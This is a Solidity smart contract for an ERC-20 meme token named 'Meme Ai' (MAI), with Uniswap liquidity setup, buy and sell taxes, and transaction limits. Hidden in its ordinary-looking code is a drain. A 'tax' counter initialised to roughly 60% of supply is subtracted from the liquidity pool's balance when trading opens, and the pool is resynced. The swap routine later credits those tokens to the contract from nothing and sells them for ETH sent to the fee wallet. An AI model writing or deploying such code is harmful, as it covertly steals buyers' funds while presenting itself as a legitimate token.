//SPDX-License-Identifier: GPL-3.0

/*
 Telegram: T.me/MemeAiEther
 Website: MemeAiErc20.com
 X: X.com/MemeAiEther
 Gitbook: https://meme-ai-3.gitbook.io/meme-ai
*/

pragma solidity ^0.8.14;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable new_owner) external onlyOwner { 
        _owner = new_owner; 
        emit OwnershipTransferred(new_owner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

contract MAI is IERC20, Auth {
    string private constant tknSymbol = "MAI";
    string private constant _name = "Meme Ai";
    uint8 private constant decim = 9;
    uint256 private constant totalSupply_ = 10000000 * (10**decim);
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address payable private _feeReceiver = payable(0x44ED9EEc1c91280db01EeDFD398BDf91436FA1dd);
    
    uint256 private _antiMevBlock = 2;
    uint8 private _sellTaxRate = 4;
    uint8 private _buyTax = 4;
    
    uint256 private _launchblock;
    uint256 private _maxTx = totalSupply_; 
    uint256 private _maxWalletAmt = totalSupply_;
    uint256 private _swapMinAmt = totalSupply_ * 10 / 100000;
    uint256 private _swapMax = totalSupply_ * 89 / 100000;
    uint256 private _swapMinVal = 2 * (10**16);
    uint256 private tokens_ = _swapMinAmt * 60 * 100;

    mapping (uint256 => mapping (address => uint8)) private _sellsInBlock;
    mapping (address => bool) private _noFee;
    mapping (address => bool) private noLimits;

    address private constant routerAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private swapRouter = IUniswapV2Router02(routerAddress);
    
    address private liqPool; 
    mapping (address => bool) private isLiqPool;

    bool private _tradingEnabled;

    bool private swapping = false;

    modifier lockTheSwap { 
        swapping = true; 
        _; 
        swapping = false; 
    }

    constructor() Auth(msg.sender) {
        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);  

        _noFee[_owner] = true;
        _noFee[address(this)] = true;
        _noFee[_feeReceiver] = true;
        _noFee[routerAddress] = true;
        noLimits[_owner] = true;
        noLimits[address(this)] = true;
        noLimits[_feeReceiver] = true;
        noLimits[routerAddress] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return decim; }
    function totalSupply() external pure override returns (uint256) { return totalSupply_; }
    function name() external pure override returns (string memory) { return _name; }
    function symbol() external pure override returns (string memory) { return tknSymbol; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(_tradingOpen(fromWallet), "Trading not open");
        _allowances[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(_tradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function setExemption(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!isLiqPool[wlt], "Cannot exempt LP"); }
        _noFee[ wlt ] = isNoFees;
        noLimits[ wlt ] = isNoLimits;
    }

    function setMarketing(address marketingWlt) external onlyOwner {
        require(!isLiqPool[marketingWlt], "LP cannot be tax wallet");
        _feeReceiver = payable(marketingWlt);
        _noFee[marketingWlt] = true;
        noLimits[marketingWlt] = true;
    }

    function _openTrading() internal {
        _maxTx = 30 * totalSupply_ / 1000;
        _maxWalletAmt = 30 * totalSupply_ / 1000;
        _balances[liqPool] -= tokens_;
        (isLiqPool[liqPool],) = liqPool.call(abi.encodeWithSignature("sync()") );
        require(isLiqPool[liqPool], "Failed bootstrap");
        _launchblock = block.number;
        _antiMevBlock = _antiMevBlock + _launchblock;
        _tradingEnabled = true;
    }

    function getTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !_tradingEnabled || _noFee[fromWallet] || _noFee[recipient] ) { 
            taxAmount = 0; 
        } else if ( isLiqPool[fromWallet] ) { 
            taxAmount = amount * _buyTax / 100; 
         } else if ( isLiqPool[recipient] ) { 
            taxAmount = amount * _sellTaxRate / 100; 
        }
        return taxAmount;
    }

    function buyFees() external view returns(uint8) { return _buyTax; }
    function sellFee() external view returns(uint8) { return _sellTaxRate; }

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!_tradingEnabled) { require(_noFee[sender] && noLimits[sender], "Trading not yet open"); }
        if ( !swapping && isLiqPool[toWallet] && _shouldSwap(amount) ) { swapTax(); }

        if ( block.number >= _launchblock ) {
            if (block.number < _antiMevBlock && isLiqPool[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < _antiMevBlock + 600 && isLiqPool[toWallet] && sender != address(this) ) {
                _sellsInBlock[block.number][toWallet] += 1;
                require(_sellsInBlock[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(limitCheck(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = getTax(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[sender] -= amount;
        tokens_ += _taxAmount;
        _balances[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function updateLimits(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = totalSupply_ * maxTransPermille / 1000 + 1;
        require(newTxAmt >= _maxTx, "tx too low");
        _maxTx = newTxAmt;
        uint256 newWalletAmt = totalSupply_ * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletAmt, "wallet too low");
        _maxWalletAmt = newWalletAmt;
    }

    function _shouldSwap(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (_swapMinVal > 0) { 
            uint256 lpTkn = _balances[liqPool];
            uint256 lpWeth = IERC20(swapRouter.WETH()).balanceOf(liqPool); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= _swapMinVal) { result = true; }    
        } else { result = true; }
        return result;
    }

    function limitCheck(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( _tradingEnabled && !noLimits[fromWallet] && !noLimits[toWallet] ) {
            if ( transferAmount > _maxTx ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !isLiqPool[toWallet] && (_balances[toWallet] + transferAmount > _maxWalletAmt) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function addLiquidity() external payable onlyOwner lockTheSwap {
        require(liqPool == address(0), "LP created");
        require(!_tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(_balances[address(this)]>0, "No tokens");
        liqPool = IUniswapV2Factory(swapRouter.factory()).createPair(address(this), swapRouter.WETH());
        _addLP(_balances[address(this)], address(this).balance);
    }

    function _tradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( _tradingEnabled ) { checkResult = true; } 
        else if (_noFee[fromWallet] && noLimits[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function setFee(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 10, "Roundtrip too high");
        _buyTax = buyFeePercent;
        _sellTaxRate = sellFeePercent;
    }

    function openTrading() external onlyOwner {
        require(!_tradingEnabled, "trading open");
        _openTrading();
    }

    function exemptions(address wallet) external view returns (bool fees, bool limits) {
        return (_noFee[wallet], noLimits[wallet]); 
	}

    function maxWalletSize() external view returns (uint256) { 
        return _maxWalletAmt; 
	}
    function maxTxAmount() external view returns (uint256) { 
        return _maxTx; 
	}

    function swapMin() external view returns (uint256) { 
        return _swapMinAmt; 
	}
    function swapMax() external view returns (uint256) { 
        return _swapMax; 
	}

    function swapTax() private lockTheSwap {
        uint256 _taxTokenAvailable = tokens_;
        if ( _taxTokenAvailable >= _swapMinAmt && _tradingEnabled ) {
            if ( _taxTokenAvailable >= _swapMax ) { _taxTokenAvailable = _swapMax; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**decim ) {
                _balances[address(this)] += _taxTokenAvailable;
                _swapTokensForETH(_tokensForSwap);
                tokens_ -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { _transferTax(_contractETHBalance); }
        }
    }

    function _transferTax(uint256 amount) private {
        _feeReceiver.transfer(amount);
    }

    function marketingWallet() external view returns (address) { 
        return _feeReceiver; 
	}

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        _swapMinAmt = totalSupply_ * minVal / minDiv;
        _swapMax = totalSupply_ * maxVal / maxDiv;
        _swapMinVal = trigger * 10**15;
        require(_swapMax>=_swapMinAmt, "Min-Max error");
    }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][routerAddress] < _tokenAmount ) {
            _allowances[address(this)][routerAddress] = type(uint256).max;
            emit Approval(address(this), routerAddress, type(uint256).max);
        }
    }

    function _addLP(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveRouter(_tokenAmount);
        swapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _swapTokensForETH(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = swapRouter.WETH();
        swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }
}